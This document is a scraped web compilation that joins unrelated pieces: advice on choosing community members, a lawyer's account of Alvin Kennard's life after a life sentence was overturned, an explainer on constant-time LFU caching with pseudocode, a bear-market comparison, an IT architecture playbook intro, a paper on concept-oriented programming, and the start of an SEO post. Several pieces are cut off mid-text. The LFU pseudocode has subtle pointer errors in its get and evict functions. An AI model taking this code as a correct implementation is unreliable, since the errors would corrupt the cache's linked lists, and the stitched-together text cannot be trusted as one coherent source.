quality determines community success</h3><p>To visualize what makes a community successful, it can help to build a flywheel diagram to show which inputs produce positive outputs. The flywheel for a well-functioning community might look something like this:</p><figure><img src="https://lh6.googleusercontent.com/gqSgANYr0PNoKEs-b5nUhzbkAgM0lO0Z2EjnCZCumedI1_LMqRkxX8ifx5MkO3zqLXMX7Bp5N-qUY8jmzgCBW91d5o3KvzOGM0hV2hz8aZXbVrYEVCZoJi5WG4vw0RDBLxVB8yhJ" alt=""></figure><p>New Member demand helps the community to grow in size generating more membership dues that community leaders can invest in capabilities like events, tools, and staff. These capabilities increase and improve interactions between members, making them more likely to create value for one another and renew their memberships. A healthy member base enhances the community’s reputation, which spurs more new member demand.</p><p>However, as anyone who’s been part of a community knows, bigger communities don’t always have better member experiences. Poorly chosen members can have significant negative impacts on a community.</p><figure><img src="https://lh4.googleusercontent.com/xq5aP4EqyK2_2Zil8z6SmrMjoiTDVm_ib9EFXEkAbi-exhq5I88tnn_0mgefuofS8zmsfRQVcgtY8wamx35B-bcNu8GXlZuEGxqLUi7LZtL0HcF1KeYDb2AdRwBcoMFUiYnbNHyC" alt=""></figure><p>Poorly-chosen members can:</p><ul><li><strong>Make it harder for communities to invest in capabilities</strong> like events or forums, since these members are likely to abuse them.</li><li><strong>Decrease the quality of member interactions</strong> as well as the quantity (since good members may end up avoiding the group)</li><li><strong>Reduce member value</strong> by ruining group cohesion and reducing the ability of members to signal high status through their affiliation with the group</li><li><strong>Lower member retention</strong> since they diminish the value members get from the group</li><li><strong>Diminish the community’s reputation</strong> since it’s clear the group does not have a strong filter for who they admit</li><li><strong>Suppress new member demand</strong> since the community will drive less positive referrals</li></ul><p>Well-chosen members, on the other hand, can have the opposite effect on each of these variables.</p><figure><img src="https://lh5.googleusercontent.com/uFDWj5uDfsXDQbCymMtXbob38YOMv2MMvQR6OLOMklJHzP5zwrBw-xKTM8W0Qz24Bj1w635q92eF0waEVdZfBFCY0CqDUajs2rvire8DtP37Q7I6DFCMUI1Xj8gBP2TbGJqxaQ09" alt=""></figure><p>Context matters. While a junior UX designer might add a lot of value to a group of job seekers trying to break into the field, he likely has little to offer to a group of high-level design leaders. To determine who’s a fit, you’ll want to get an understanding of your ideal member profile and make sure the applicants you are admitting are capable of creating value for your chosen persona.</p><p>When evaluating applicants, it can help try to place them into one of the following categories:</p><figure><img src="https://lh6.googleusercontent.com/ExvUg0KAJFyewoUyS5WaCWeJtRwKRpjfsKO0G64Hs4EAn4ZEc_pNLNgpZCEVHO8YePykSOAUcCdhRZ_99qxV7amohXd9cVcbcDQKJSbS-iog303eThCOn_-Sj24qu6jgXyqJVA2Y" alt=""></figure><ul><li><strong>Adders</strong> will hopefully be the core of your group. They do their best to create more value than they capture and generally make the community a better place.</li><li><strong>Subtractors</strong> are those who are simply not good fits for your group because they can’t provide the type of value that other members want. If one gets through your filter, it’s not the end of the world, but you will risk damaging your member experience if this becomes a pattern.</li><li><strong>Dividers </strong>can be toxic to the point that they end up negatively impacting other members’ behavior in their orbit, creating fights, and sometimes even staging coups against group leaders. If their behavior goes unchecked, they can cause no end of trouble. If you identify one of these people in your group, get them out.</li><li><strong><strong><strong>Multipliers </strong></strong></strong>are members whose positive behavior elevates everyone they come in contact with. These people are quite rare, but when you find one in your community, do anything you can to keep them.</li></ul><p>You’ll also want to consider whether each member can make a <em>distinctive</em> contribution to the rest of the group, or if they just bring more of the same. Amazon wouldn’t be a useful place to shop if it didn’t have a variety of products. Similarly, a community can’t provide much value if its members are too similar. You want to have a good assortment of people with different attitudes, skill sets, and life experiences, so your members can find better matches with one another. Prioritizing group diversity also ensures that members can find their niche and don’t feel too competitive with one another.</p><p><strong>Pro Tip:</strong> <strong>Marquee Members</strong> </p><p>Marquee members are individuals who get recruited into the group based on their external prestige. Early on, you might be tempted to recruit one or two members like this to draw others into the group. However, this is a risky strategy. New members will naturally look to people with external status to determine how to behave. If your group doesn’t yet have its value delivery system figured out, you risk your marquee members disengaging from the group and spreading their attitude to others.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="be-careful-over-investing-in-community-capabilities">Be careful over-investing in community capabilities</h3><p>While members can create a good deal of value, they won’t invest time and energy into the community if they feel like they are doing all the work. That’s why as your member base grows, it’s worth investing in capabilities to help your members discover and interact with one another like:</p><ul><li><strong>Event hosting</strong> &nbsp;to throw retreats, webinars, happy hours, etc.</li><li><strong>Content production</strong> &nbsp;to publicize the accomplishments of members</li><li><strong>Member directories</strong> to enable member discovery</li><li><strong>Knowledge repositories </strong>to artifact and disseminate shared expertise</li><li><strong><strong><strong>Forum hosting </strong></strong></strong>to create spaces for questions to get asked and answered</li><li><strong><strong><strong>Chat moderation </strong></strong></strong>to promote quality interactions</li></ul><p>Most community leaders make the mistake of assuming capabilities like these provide the bulk of benefits members experience. In reality, the value they create depends on the quality of the members in the group. &nbsp;For example, if a community has a bunch of “subtractors” or “dividers,” they may use your member directory to spam the rest of the group. On the contrary, getting six “multipliers” into a well-structured Zoom conversation can create amazing results.</p><p>Another reason not to overdo it on capabilities is that they increase the costs of maintaining your community. Once introduced, costly features can be hard to roll back. No one wants to fire a staff member or discontinue a popular event series. The best solution tends to be keeping costs low until you’re sure you’ve got a sticky community that drives real demand.</p><p><strong>Pro tip: Ask your members to contribute</strong></p><p>In the early days, when money is scarce, your community can punch above its weight by having members chip in to perform various functions. Don’t be afraid to ask members to act as forum moderators or event hosts. People are hungry to …</p></div></section></article></div></div></div>

<p>One year ago, Alvin Kennard stood in a Bessemer courtroom nervous and uncertain. Striped jailhouse scrubs swallowed his rail-thin, shivering frame. After 36 years in a sweltering, unairconditioned prison, the chilled air of Judge David Carpenter’s courtroom was a shock to his system.</p>
<p>What came next was a shock to the justice system.&nbsp; In 1983, Mr. Kennard had been sentenced to life without parole for a $50 robbery at a bakery. Judge Carpenter scrapped that and resentenced him to time served. A courtroom filled with Mr. Kennard’s friends and family erupted in hallelujahs. The television cameras started rolling.&nbsp; As his attorney, and a worrier by nature, I immediately started thinking about next steps: This 58-year-old man had been incarcerated nearly two-thirds of his life. How on earth was he going to adjust to the outside world?</p>
<p>Extremely well, it turned out. Alvin Kennard filed a tax return this year. He tithes at church. He hasn’t even been affected by Covid-19, other than limits on the family gatherings he loves.</p>

August 28 marks the year anniversary of his freedom from a sentence of Life Without Parole for a $50 robbery. By Bernard Troncale</p></div>
<p>Mr. Kennard’s large, supportive family was critical to his successful re-entry. A room was ready in his brother’s home. A niece, who is a Bessemer businessowner, helped with transportation. Church connections helped him secure employment within six weeks at Town and Country Ford, where he works in the body shop buffing cars. Every so often, he calls me on his lunch break and lets me know things are still going just fine. &nbsp;During the holidays, he texted me photos of him at the staff holiday party, standing next to a huge inflatable polar bear. Imagine returning from Alabama’s hellish prisons to a world where holidays are filled with enormous glowing inflatables. Mr. Kennard embraces it all – with joy.</p>
<p>“It’s almost a year I’ve had my job,” he remarked recently. “It’s been a blessing, it’s been wonderful. It’s not about how much money I’m making, it’s about what God allowed me to do.”</p>
<p>He loves listening to the birds chatter in the mornings, wandering down to the creek of his childhood and watching turtles and snakes. He’s got a favorite meat-and-three restaurant, Kayla’s, that’s helped him put on much-needed weight.</p>

<p>All conversations with Alvin Kennard eventually lead toward God. No matter how hard I try to give him credit for how hard he worked, how much he suffered, how he deserves a good life, he invokes God and the conversation becomes a prayer.</p>
<p>I wish more Alabama legislators, judges, and prosecutors could pray with Mr. Kennard.</p>
<p>Until last year, he was labeled a “violent felon” based on his robbery conviction at age 22.&nbsp; Because of three minor non-violent convictions stemming from the same arrest at age 18, he was labeled a habitual offender.&nbsp; Based on the calls and mail that poured into Alabama Appleseed’s office following news of Mr. Kennard’s freedom, there is a world out there that does not see him as a violent felon. &nbsp;“A few month ago, I heard about you. My father was from Alabama, Bessemer, too,” wrote Elizabeth, from Spokane, Washington, who mailed him a little cash – “a gift, so that your days moving forward are hopeful, full of love and belonging.”</p>
<p>Elizabeth acknowledged something else about Mr. Kennard’s story: “I’m learning more about how horrible the police and jail systems are (&amp; the laws, too). It’s not new … but the depth of the corrupt mission is being seen.”</p>
<p>At Appleseed, we’ve also gotten mail from those still stranded in prison honor dorms. Men in their 60s, 70s, one who is 86, sentenced to die in prison for the sins of their youth under Alabama’s draconian Habitual Felony Offender Law. They tell us about their kidney problems, their high blood pressure, their crack-cocaine addictions from the 1980s that led to convenience-store hold ups and courthouse decisions that they were forever beyond redemption. Except now, they are the prisons’ hospice workers, GED teachers, barbers, launderers, preachers, peacemakers, and clean-up crew.&nbsp; “The [whole] time I’ve been in, I’ve worked as a hall runner, shift office runner, infirmary runner and have seen so much brutal violence and had to clean up so much blood out of cells, off of walls and hallways and had to help pick up dead inmates or seem dead and get them to the infirmary,” wrote one man whose conviction dates back to the first Bush Presidency. “I’ve had so much prison blood on my hands, I see it in my sleep.”</p>
<p>Due to the limitations and complexities of Alabama criminal procedure, there is currently no clear vehicle for second chances for these old men in the honor dorms. &nbsp;Mr. Kennard is free only through extraordinary mercy and grace from Judge Carpenter and the Bessemer Cutoff District Attorney’s Office led by Lynneice Washington.</p>

<p>Mr. Kennard turns 60 this year. He will celebrate a full year of employment and get a week’s paid vacation. Most likely he’ll purchase a new suit or two. If there’s one thing I’ve learned about Mr. Kennard this year – beyond his faith and his work ethic – is that he is a sharp dresser, which makes it all the more unfortunate that the cameras were rolling on him while he wore faded jailhouse scrubs.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>A common strategy to make any system super-performant is <em><a href="https://en.wikipedia.org/wiki/Cache_(computing)">Caching</a>.</em> Almost all software products, operating at scale, have multiple layers of caches in their architectures. Caching, when done right, does wonder to the response time and is one of the main reasons why products work so well at a massive scale. Cache engines are limited by the amount of memory available and hence once it gets full the engine has to decide which item should be evicted and that is where an eviction algorithm, like <a href="https://en.wikipedia.org/wiki/Least_frequently_used">LFU</a> and <a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)">LRU</a>. kicks in.</p>
<p><a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)">LRU</a> (Least Recently Used) cache eviction strategy is one of the most popular strategies out there. LFU (Least Frequently Used) strategy fares well in some use cases but a concern with its most popular implementation, where it uses a min-heap, is that it provides a running time complexity of <code>O(log n)</code> for all the three operations - insert, update and delete; because of which, more often than not, it is replaced with a sub-optimal yet extremely fast <code>O(1)</code> LRU eviction scheme.</p>
<p>In this essay, we take a look at Constant Time LFU implementation based on the paper <a href="http://dhruvbird.com/lfu.pdf">An O(1) algorithm for implementing the LFU cache eviction scheme</a> by Prof. Ketan Shah, Anirban Mitra and Dhruv Matani, where instead of using a min-heap, it uses a combination of <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">doubly-linked lists</a> and <a href="https://en.wikipedia.org/wiki/Hash_table">hash table</a> to gain a running time complexity of <code>O(1)</code> for all the three core operations.</p>

<p>LFU, very commonly, is implemented using a <a href="https://en.wikipedia.org/wiki/Min-max_heap">min-heap</a> which is organized as per the frequency of access of each element. Each element of this heap holds a pair - cached value and the access frequency; and is structured in order of this frequency such that the cached value with the minimum access frequency sits at the top, making it quick to identify the element to be evicted.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/89717235-0fd1f900-d9d2-11ea-968d-9ed67f52a2db.png" alt="min-heap LFU"></p>
<p>Although the identification of the element to be evicted is quick, but in order for the heap to maintain its property - element with lowest access frequency be at the top - it demands a rebalance, and this rebalancing process has a running complexity of <code>O(log n)</code>. To make things worse, rebalancing is required every single time the frequency of an item is changed; which means that in the cache that implements LFU, every time an item is either inserted, accessed or evicted, a rebalance is required - making all the three core operations to have the time complexity of <code>O(log n)</code>.</p>

<p>The LFU cache can be implemented with <code>O(1)</code> complexity for all the three operations by using one <a href="https://en.wikipedia.org/wiki/Hash_table">Hash Table</a> and a bunch of <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">Doubly Linked Lists</a>. As stated by the <a href="https://arpitbhayani.me/blogs/rum">RUM Conjecture</a>, in order to get a constant time reads and updates operations, we have to make a compromise with memory utilization. This is exactly what we observe in this implementation.</p>
<h2>The Hash Table</h2>
<p>The Hash Table stores the mapping of the cached key to the Value Node holding the cached value. The value against the key is usually a pointer to the actual Value Node. Given that the lookup complexity of the hash table is <code>O(1)</code>, the operation to access the value given the key from this Hash Table could be accomplished in constant time.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/90469594-e2561f80-e136-11ea-9ff4-8369a7ea3df3.png" alt="LFU hash table"></p>
<p>The illustration above depicts that the Hash Table holding cache keys <code>k1</code>, <code>k2</code>, etc are mapped to the nodes holding the values <code>v1</code> and <code>v2</code> through direct pointers. The nodes are allocated on the heap using dynamic allocation, hence are a little disorganized. The Value Node to which the key maps to, not only hold the cached value, but it also holds a few pointers pointing to different entities in the system, enabling constant-time operations.</p>
<h2>Doubly Linked Lists</h2>
<p>This implementation of LFU requires us to maintain one Doubly Linked List of frequencies, called <code>freq_list</code>, holding one node for each unique frequency spanning all the caches values. This list is kept sorted on the frequency the node represents such that, the node representing the lowest frequency is on the one end while the node representing the highest frequency is at the other.</p>
<p>Every Frequency Node holds the frequency that it represents in the member <code>freq</code> and the usual <code>next</code> and <code>prev</code> pointers pointing to the adjacent Frequency Nodes; it also keeps a <code>values_ptr</code> which points to another doubly-linked list holding Value Nodes (referred in the hash table) having the same access frequency <code>freq</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/90469593-e08c5c00-e136-11ea-995b-e4590981dd89.png" alt="lists LFU"></p>
<p>The overall schematic representation of doubly-linked lists and its arrangement is as shown in the illustration above. The doubly-linked list holding Frequency Nodes is arranged horizontally while the list holding the Value Nodes is arranged vertically, for clearer view and understanding.</p>
<p>Since the cached values <code>v1</code> and <code>v7</code> both have been accessed <code>7</code> times, they both are chained in a doubly-linked list and are hooked with the Frequency Node representing the frequency of <code>7</code>. Similarly, the Value Nodes holding values <code>v5</code>, <code>v3</code>, and <code>v9</code> are chained in another doubly-linked list and are hooked with the Frequency Node representing the frequency of <code>18</code>.</p>
<p>The Value Node contains the cached value in member <code>data</code>, along with the usual <code>next</code> and <code>prev</code> pointers pointing to the adjacent Value Nodes in the list. It also holds a <code>freq_pointer</code> pointing back to the Frequency Node to which the list if hooked at. Having all of these pointers helps us ensure all the three operations happen in constant time.</p>
<p>Now that we have put all the necessary structures in place, we take a look at the 3 core operations along with their pseudo implementation.</p>
<h2>Adding value to the cache</h2>
<p>Adding a new value to the cache is a relatively simpler operation that requires a bunch of pointer manipulations and does the job with a constant time running complexity. While inserting the value in the cache, we first check the existence of the key in the table, if the key is already present and we try to put it again the function raises an error. Then we ensure the presence of the Frequency Node representing the frequency of <code>1</code>, and in the process, we might also need to create a new frequency node also. Then we wrap the value in a Value Node and adds it to the <code>values_list</code> of this Frequency Node; and at last, we make an entry in the table acknowledging the completion of the caching process.</p>
<pre><code><span><span>def</span> <span>add</span><span>(key: str, value: object)</span>:</span>
    
    
    <span>if</span> key <span>in</span> table:
        <span>raise</span> KeyAlreadyExistsError

    
    
    value_node = make_value_node(value)

    first_frequency_node = freq_list.head
    <span>if</span> first_frequency_node.freq != <span>1</span>:
        
        
        first_frequency_node = make_frequency_node(<span>1</span>)

        
        
        
        first_frequency_node.next = freq_list.head
        freq_list.head.prev = first_frequency_node
        freq_list.head = first_frequency_node

    
    value_node.freq_pointer = first_frequency_node

    
    first_frequency_node.values.add(value_node)

    
    table[key] = value_node
</code></pre>
<p>As seen in the pseudocode above the entire procedure to add a new value in the cache is a bunch of memory allocation along with some pointer manipulations, hence we observe that the running complexity of <code>O(1)</code> for this operation.</p>
<h2>Evicting an item from the cache</h2>
<p>Eviction, similar to insertion, is a trivial operation where we simply pick the frequency node with lowest access frequency (the first node in the <code>freq_list</code>) and remove the first Value Node present in its <code>values_list</code>. Since the entire eviction also requires pointer manipulations, it also exhibits a running complexity of <code>O(1)</code>.</p>
<pre><code><span><span>def</span> <span>evict</span><span>()</span>:</span>
    <span>if</span> freq_list.head <span>and</span> freq_list.head.values:
        first_value_node = freq_list.head.values.first
        second_value_node = first_value_node.next

        
        freq_list.head = second_value_node

        
        second_value_node.prev = <span>None</span>

        
        delete_value_node(first_value_node)

    <span>if</span> freq_list.head <span>and</span> <span>not</span> freq_list.head.values:
        
        
        delete_frequency_node(freq_list.head)
</code></pre>
<h2>Getting a value from the cache</h2>
<p>Accessing an item from the cache has to be the most common operation of any cache. In the LFU scheme, before returning the cached value, the engine also has to update its access frequency. Ensuring the change in access frequency of one cached value does not require some sort of rebalancing or restructuring to maintain the integrity, is what makes this implementation special.</p>
<p>The engine first makes a get call to the Hash Table to check that the key exists in the cache. Before returning the cached value from the retrieved Value Node, the engine performs the following operations - it accesses the Frequency Node and its sibling corresponding to the retrieved Value Node. It ensures that the frequency of the sibling is 1 more than that of the Frequency Node; if not it creates the necessary Frequency Node and place it as the new sibling. The Value Node then changes its affinity to this sibling Frequency Node so that it correctly matches the access frequency. In the end, the back pointer from the Value Node to the new Frequency Node is set and the value is returned.</p>
<pre><code><span><span>def</span> <span>get</span><span>(key: str)</span> -&gt; object:</span>
    
    value_node = table.get(key, <span>None</span>)

    
    
    <span>if</span> <span>not</span> value_node:
        <span>raise</span> KeyNotFoundError

    
    
    frequency_node = value_node.freq_pointer

    
    
    
    next_frequency_node = frequency_node.next

    <span>if</span> next_frequency_node.freq != frequency_node.freq + <span>1</span>:
        
        new_frequency_node = make_frequency_node(frequency_node.freq + <span>1</span>)
        
        
        frequency_node.next = new_frequency_node
        new_frequency_node.prev = frequency_node

        next_frequency_node.prev = new_frequency_node
        new_frequency_node.next = frequency_node

        
        
        next_frequency_node = new_frequency_node

    
    next_frequency_node.values.add(value_node)
    
    
    value_node.freq_pointer = next_frequency_node
    value_node.next = <span>None</span>
    value_node.prev = next_frequency_node.values.last
    
    
    
    <span>if</span> len(frequency_node.values) == <span>0</span>:
        delete_frequency_node(frequency_node)

    
    <span>return</span> value_node.value
</code></pre>
<p>Again, since this operation also only deals with pointer manipulations through direct pointers, the running time complexity of this operation is also constant …</p></div></div></div>

<p>The US market indexes entered bear market territory in March of 2020. It has been a long time since the US has experienced a bear market, 13 years to be precise.  Since the best way to learn about the present is to look at the past, it is a good time for comparing the last 10 bear markets before 2020.</p>



<p>They range in time from 1956 to 2020 and lasted between 18 and 87 months before a total recovery was achieved.  By almost any measurement, the current 2020 bear market is the mildest on record so far.  Lets look at the last 10 bear markets.</p>

<p>Looking at the data quite a few things stand out.  The average bear market lasts 42 months overall, but sees 35% drop in the stock market over 14 months before it recovers.  Lets look a little closer.</p>



<h3>How Often Do Bear Markets Occur</h3>



<p>Between 1956 and 2020 there have been a total of 10 bear markets.  This is spread out over 64 years for an average of 6.4 years between markets.   Our last bear market was all the way back in 2007, or 13 years ago.   </p>



<p>By the laws of averages we were way overdue.  Previously, the last longest time between bear markets was also 13 years with the bear market starting in 2000.  Also note, the 2000  bear market saw the second largest drop on record of 49.1%!</p>



<h3>How Long Do Bear Markets Take to Bottom Out</h3>



<p>Bear markets bottomed out over an average of 14 months from the time they begun.  The fastest a market every bottomed out was in 1987 with 3 months. </p>



<p>If the current bear market has bottomed out, and don’t assume it has, it would win the fastest drop to the bottom at a rapid 2 months.</p>



<h3>How Much Do Stocks End Up Dropping</h3>



<p>On average a bear market sees a 35% decline from peak to trough.  The all time peak was 56.8% caused by the great financial crises created by the housing bubble of 2007.</p>



<p>By comparison, 2020’s current max drop of -26.7% from peak is pretty tame.    Don’t assume that stocks have found the bottom though, as of August 2020 this is still a very young bear market.</p>



<h3>How Long Do They Last</h3>



<p>Bear market last 42 months on average, with the shortest on record at 18 months.  This is bad news for those that believe the 2020 bear market is already over.  If this ends up being true, it would be by far the shortest bear market on record.  Let’s just hope we don’t end up at 87 months, which is the longest on record.</p>



<h2>Conclusion</h2>



<p>It is interesting to look back in time comparing the last 10 US stock bear markets.  It is impossible to say how bad the current bear market will get or how long it will last, but judging from the past bear markets it is likely not over yet.  </p>



<p>Considering the economic turmoil that we may still yet have in front of us, it is a good time to review your financial positions and make sure you are comfortable you can weather the storm.  Make sure your assets are diversified and that you are comfortable with your risk profile.  You should be very careful with any <a href="https://www.dollartrak.com/speculating-vs-investing/">speculative</a> holdings that risk total loss.</p>

<p>Smart people have been thinking on how to create IT architectures as long as there has been computers. Ideas come and go, however creating a good architectures can still be complex and time consuming. Especially when you try to invent the wheel for yourself. With this interactive playbook you can create your IT architecture better and faster. The focus of this architecture playbook is in on:</p>
<ol>
<li><p>Knowledge reuse. Why reinvent the wheel again? It is far and more fun to create a better wheel for your organisation or IT project instead! Focus on the hard complex context specific issues. Use good open tools and knowledge for the easy 80%!</p></li>
<li><p>Easier creation of architecture documents and deliverables. This playbook has an extensive list of all(*) open tools available for creating your IT architecture or design. Using these open tools will speed up the process of creating your architecture deliverables and reduce your risks.</p></li>
<li><p>Quality improvement. By making use of content parts provided for various architecture deliverables you will lower your business risks. Complex business IT projects will fail. Now and in future. But if you make use of proven methods and tools developed from decades of IT architecture scientific research you will lower the risk for your project. Architecture will help to make your projects more successful in terms of costs, speed and profitability.</p></li>
</ol>
<p>(*) If you miss a good open tool that is also usable for IT architecture creation, do not hesitate to contribute to this open publication!</p>
<p>This architecture playbook is divided in the commonly used architecture sections:</p>
<ul>
<li><p>Business</p></li>
<li><p>Data</p></li>
<li><p>Applications and of course</p></li>
<li><p>Technology Infrastructure (TI)</p></li>
</ul>
<p>This playbook is primarily created for on-line usage. But also ePUB and PDF versions are available.</p>
<div id="why-this-architecture-playbook">
<h2>Why this architecture playbook?<a href="#why-this-architecture-playbook" title="Permalink to this headline">¶</a></h2>
<p>Creating a business IT architecture has many benefits. However creating a complete architecture is known to be:</p>
<ul>
<li><p>Difficult</p></li>
<li><p>Time consuming</p></li>
</ul>
<p>Of course many tools have been developed the last 30 years to make creating architecture (documents) easier. However many tools force you into a very tight harness without the needed flexibility. Complex problems need flexible solutions and tools should not slow you down in creating sketches, documents and typical architecture deliverables. A one size fits tool for solving complex business IT problems does not exist. And since creating good architectures is knowledge intensive work that delivers real value for business you should be aware of vendor lock-ins and using methods and tools that do not share knowledge sharing. Open Source tools and open access documentation offer a default head start for reuse and improvement of knowledge work in IT architecture.</p>
<p>You can buy and read many many books on how to do architecture well. All books claim a magic method and promise ultimate success when followed. We love books and reading methods. E.g. TOGAF.  However this playbook is different. This architecture playbook is not about describing how you should create your architecture. You are free to use every method you want. This architecture playbook is all about giving you direct usable content and tools that you can use and reuse for your architecture challenge.</p>
<p>So this playbook brings you ultimate freedom and flexibility. You can export the results from certain tools in any desired format. In this way you can still use your architecture enterprise tool(s) that you already have invested deeply in. So use the outcome of tools within this playbook in combination with the enterprise architecture tool that are mandatory within your organisation.</p>
</div>
<div id="what-is-in-this-architecture-playbook">
<h2>What is in this architecture playbook?<a href="#what-is-in-this-architecture-playbook" title="Permalink to this headline">¶</a></h2>
<p>Many good books and courses already exist that cover the why and how of (Enterprise) IT architecture. So this book will not explain aspects and concepts of the very broad field of IT architecture. This playbook is targeted on providing practical tools for creating your IT architecture or design faster and better. So the focus is 100% on the real thing by using the following leading principles:</p>
<ol>
<li><p>Tools that speed up creating your business IT Architecture.</p></li>
<li><p>Collections of principles, requirements, standards and reference architecture that speed up the creation of your architecture deliverable.</p></li>
<li><p>Collection of various Architecture OSS Tools that speed up creating your business IT architecture.</p></li>
<li><p>Collection of architecture QA  tools to control and manage your IT projects.</p></li>
<li><p>Collection of reusable reference architectures, foundation architecture, architecture journals and more. Knowing where you can find what in an easy way will reduce your time. So you will have more time to spend on solving your problem in your organization.</p></li>
</ol>

         <h4> Abstract </h4>
         <p>In the paper we introduce a new programming language construct, called concept, which is defined as a pair of two classes: one reference class and one object class. Instances of the reference class are passed-by-value and are intended to indirectly represent objects. Instances of the object class are passed-by-reference. Each concept has a parent concept specified by means of the concept inclusion relation. This approach where concepts are used instead of classes is referred to as concept-oriented programming (CoP). CoP is intended to generalize object-oriented programming (OOP). Particularly, concepts generalize conventional classes and concept inclusion generalizes class inheritance in OOP. This approach allows the programmer to describe not only objects but also references which are made integral and completely legal part of the program. Program objects at run-time exist within a virtual hierarchal address space and CoP provides means to effectively design such a space for each concrete problem domain. </p>
         <hr noshade="" size="1"> 
        <h3>1 INTRODUCTION</h3>
        <p>          Let us assume that a variable stores a reference to a bank account object. This variable is then used to access this account balance using its method, for example: <span>account.getBalance()</span>. In OOP we are completely unaware of the reference format and the operations used to access the represented object. The compiler provides primitive (native) references and the programmer has an illusion of <em>instant access </em> to objects. However, it is only an illusion and something always happens behind the scenes during object access. In other words, any object access results in a potentially complex sequence of hidden operations. For example, if the bank account is represented by a Java reference then for each access it needs to be resolved into a memory handle by JVM, which in turn needs to be resolved into an address in memory by OS and then this address is processed by CPU and other hardware. If the target object is represented by some kind of remote reference then again one method call results in a sequence of operations executed at different levels of the distributed system organisational structure. Here we see that object representation and access (ORA) functions, even if they are hidden, may account for a great deal of the overall system complexity and hence we need appropriate means for their description. </p>
        <p>Above we provided two examples where references have some internal structure and associated functions which are activated implicitly during object access at the level of run-time environent. In these and many other cases the reference format and access functions are provided in the form of a standard library or middleware. One problem with this conventional approach is that frequently we need to define our own <em>custom references </em> with their own format and associated access procedures. In this case using universal standard references with built-in functionality might be a limiting factor. For example, creating and deleting many tiny objects is known to be a very inefficient procedure. Dealing with remote objects requires special references encoding information on their location and special access procedures based on some network protocol. Using persistent objects is also based on specific requirements to their identifiers and access rules. In all these cases it would be natural to develop a special memory manager with a dedicated container which takes into account specific features of its objects. </p>
        <p>Of course, all these and many other problems can be solved using special features of operating system (like local heap), middleware (like CORBA or RMI), libraries (like Hibernate) or programming patterns (like proxy). Yet the problem remains: the standard approaches can be applied to only standard situations they are designed for while we would like to find a method for an <em>arbitrary </em> case. In other words, we would like to find a method for <em>modelling references </em> having any format and any behaviour. It is assumed that it is not known what references will be used for and what kind of objects they will represent. The programmer might need many types of references for different purposes which depend on each concrete program. In addition, ORA functions of references and functions of objects have a cross-cutting nature and cannot be easily separated and should be modelled together. Thus the idea is that the functionality that is normally part of hardware, operating system, middleware or a library can be described in the program itself using the same code as for any other functions. </p>
        <p>In this paper we propose a solution which is based on extending an object-oriented programming language by introducing new language constructs and mechanisms. The programmer then does not depend on the available environment with its standard ORA mechanisms. Rather, using the proposed approach it is possible to create internal custom containers with a virtual address system where all the objects will live. In particular, the functionality provided by middleware, OS and CPU can be successfully modelled using the programming language. If we see a statement <span>account.getBalance()</span> then we cannot assume anything on the bank account location and how it will be accessed. Its reference might contain the bank account number while the object itself might really reside in a database on a remote computer. Getting the account balance might mean using some special protocol involving also operations with some special database developed for this and only this bank. Thus references are interpreted as <em>virtual addresses </em> providing at the same time a possibility to bind them to real locations. </p>
        <p>In the proposed approach it is assumed that objects are represented and accessed <em>indirectly </em> using custom references described in the same language as used for the rest of the program. So references are completely legalized and play the same role as objects. They may have arbitrary structure and arbitrary behaviour. We also assume that developing references is as important as developing objects. Since objects are represented indirectly by custom references, any access like method call or message triggers a sequence of intermediate actions such as reference resolution, security checks, transactional operations etc. However, in contrast to the existing technologies, the proposed approach allows us to model these hidden operations within the program as its integral part. Custom references are used to create a level of indirection and unbinding object identifiers from the available software and hardware environment. </p>
        <p>The paper is organized as follows. In section 2 we introduce a new programming construct, called concept, which generalizes classes and underlies other mechanisms described in the paper. In section 3 we describe inclusion relation between concepts, which generalizes conventional class inheritance. Section 4 describes other important mechanisms such as dual methods, polymorphism and life-cycle management. Section 5 gives a short overview of related work and finally in section 6 we make concluding remarks. </p>
        <h3>2&nbsp; CONCEPT DEFINITION </h3>
        <h4>Object class and reference class </h4>
        <p>Since references are supposed to have an arbitrary structure and functions they can be modelled by the same means as objects by using classes, which are called <em>reference classes.</em> Thus in CoP there are two kinds of classes: object classes for describing objects and reference classes for describing references. For example, if we would like to identify bank accounts by their numbers then the reference could be defined as follows: </p>        
        <blockquote>
          <p><img src="http://www.jot.fm/issues/issue_2008_03/article2/images/form1.gif" width="445" height="187"></p>
        </blockquote>        <p>Here we use keyword 'reference' instead of 'class' to mark this class as a reference class. We might also add other members to this class, say, opening date field and a method for getting balance. The most important thing is that instances of a reference class, called <em>references,</em> are passed-by-value only, i.e., they do not have their own references and are intended to represent objects. On the other hand, instances of an object class are passed-by-reference, i.e., there is always some reference which represents this object. An important consequence of introducing reference classes is that objects can be represented by custom references rather than only primitive references. A program is then split into two kinds of things – objects and references – both having their own structure and functions. </p>
        <p>Using separately reference classes and object classes is possible but is not very convenient because references and objects do not exist separately but rather are two sides of one and the same thing. To model these two main elements of any program in their inseparable unity we propose to use a new programming construct, called <em>concept,</em> which is a pair consisting of one reference class and one object class. Following this approach, instead of defining separately one account class and one account reference class we need to define one concept which contains the both: </p>        
        <blockquote>
          <p><img src="http://www.jot.fm/issues/issue_2008_03/article2/images/form2.gif" width="497" height="198"></p>
        </blockquote>        <p>Notice that object classes and reference classes cannot be used separately anymore. Instead, we have to use them in pairs using concept names. Such an approach where concepts are used instead of classes is referred to as concept-oriented programming (CoP). Thus concepts in CoP are used where classes are used in OOP when declaring a type of variables, fields, parameters, return values etc. For example, in the following code all types are concepts: </p>
        <blockquote>
          <p><img src="http://www.jot.fm/issues/issue_2008_03/article2/images/form3.gif" width="476" height="62"></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p><span>Link building is the process of getting other websites to link back to your website. These links, called backlinks, are essential in how Google determines which websites rank for which keywords. In fact, after studying 11.8 million SERP results, </span><a href="https://backlinko.com/search-engine-ranking"><span>one study</span></a><span> found </span><b>the number of domains linking to a page correlated with rankings more than any other factor. </b><span>Every business owner should be interested in building links to drive referral traffic and increase their site’s authority.&nbsp;</span></p>
